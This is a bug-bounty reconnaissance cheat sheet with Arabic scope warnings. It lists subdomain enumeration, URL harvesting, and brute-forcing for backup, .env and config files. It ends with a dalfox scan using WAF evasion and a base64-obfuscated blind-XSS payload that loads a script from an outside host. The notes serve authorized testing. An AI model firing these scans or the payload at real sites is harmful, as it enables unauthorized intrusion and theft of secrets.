# Webapp Penetration Testing (Recon) — Methodology Notes

> ملخص أوامر من شرح  (Hacking Methodology). راجع الشروط والـ scope بتاع أي برنامج Bug Bounty قبل ما تستخدم أي أمر من دول، واستبدل `example.com` / `<target>` بالهدف الحقيقي المسموح لك تختبره.

## 1. Make Target Directory

```bash
mkdir bugbounty
cd bugbounty
mkdir <target>
cd <target>
```

## 2. Subdomains Enumeration

```bash
sublist3r -d example.com -b -t 50 -v -o sublist3r.txt
subextreme -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
-d example.com -c 100 -o subextreme.txt
subfinder -d example.com -all -recursive -o subfinder.txt
amass enum -d example.com -o amass_out.txt
assetfinder --subs-only example.com > asset_subs.txt
findomain -t example.com -u findomain_out.txt
theHarvester -d example.com -b all
gobuster dns -d example.com -w subdomains-top1million.txt -t 50
ffuf -u [http://FUZZ.example.com](http://FUZZ.example.com) -w subdomains.txt
cat sublist3r.txt subextreme.txt | urldedupe -s > subdomains.txt
```

## 3. Filter Valid Subdomains

```bash
httpx -l subdomains.txt -o "valid-subs.txt" -t 60 -random-agent -mc 200
```

## 4. Get Target URLs From Multiple Websites (Passive)

```bash
cat valid-subs.txt | waymore -mode B -oU waymoreUrls.txt -p 5 -mc 200
```

## 5. Filter Unique URLs

```bash
cat waymoreUrls.txt | wc
cat waymoreUrls.txt | urldedupe -s > uniq-urls.txt
cat uniq-urls.txt | wc
```

## 6. Pass URLs To Burpsuite

```bash
passurls -p 127.0.0.1:8080 -l uniq-urls.txt
```

## 7. Discover Hidden Files & Directories 🔍

```bash
dirsearch -u https://<target.com>/ -e 'conf,config,bak,backup,smp,old,db,sql,asp,aspx,py,rb,php,bhp,cache,cgi,csv,html,inc,jar,js,json,jsp,lock,log,rar,sql.gz,sql.zip,tar,tar.bz2,txt,wadl,zip,xml,swp,x~,asp~,py~,rb~,php~,bkp,jsp~,rar,gz,sql~,swp~,wdl,env,ini' --full-url --delay=10 --timeout=30 -p 127.0.0.1:8080 --random-agent -t 100 -w ~/SecLists/Discovery/Web-Content/combined_words.txt -o hidden-files.txt
```

## 8. Use "Crawley" Tool To Crawl The Target Deeply And Send All Traffic To Burpsuite Crawling And Browse Your Target At The Same Time <Crazy Results> 🤯

⚠️ Warning: Requires More CPU & RAM Usage

```bash
export http_proxy="http://127.0.0.1:8080"
export https_proxy="http://127.0.0.1:8080"
export ALL_PROXY="http://127.0.0.1:8080"
crawley -headless -delay 10ms -depth -1 -subdomains -all -timeout 30s -user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" -dirs show https://<target.com>/ | tee crawley.txt
```

## 9. Create a New Text To Save All Burpsuite Results And Extract All Parameters

```bash
nano burp-results.txt
# Paste all Burp's Links & URLs >> Save And Close

grep -E '\?.*=' burp-results.txt > burp-params.txt
cat burp-params.txt | urldedupe -s > parameters.txt
```

## 10. Discover Hidden Parameters 🔍

```bash
arjun -i hidden-files.txt -t 10 -c 300 -T 30 -d 10 -oB 127.0.0.1:8080 -m POST -oT hidden-params1.txt
arjun -i burp-results.txt -t 10 -c 300 -T 30 -d 10 -oB 127.0.0.1:8080 -m POST -oT hidden-params2.txt
```

##  11. Scan All Detected Parameters To Find XSS Vulnerability Via "Dalfox"

```bash
dalfox file parameters.txt --waf-evasion --user-agent --user-agent 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' --timeout 30 --proxy 'http://127.0.0.1:8080' -b '"><img src=x id=dmFyIGE9Z G9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3hkYW1hZ2V4Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onerror=eval(atob(this.id))>' -o dalfox.txt --deep-domxss
```

> ملاحظة: الـ payload ده بيستخدم Base64 encoded script وده مخصص للتسجيل (reporting) على XSS.report blind XSS service. متستخدموش غير على أهداف مصرّح لك باختبارها.


### ملاحظات عامة
- بعض الأدوات (sublist3r, httpx, waymore, urldedupe, dirsearch, crawley, arjun, dalfox) لازم تتثبّت الأول وتتأكد من توافر الـ PATH بتاعها.
- الـ wordlists بتعتمد على وجود مجلد `SecLists` في `~/SecLists`.
- دايمًا اشتغل في نطاق (scope) البرنامج المسموح بيه فقط، واقرأ الـ Policy قبل أي اختبار فعلي.
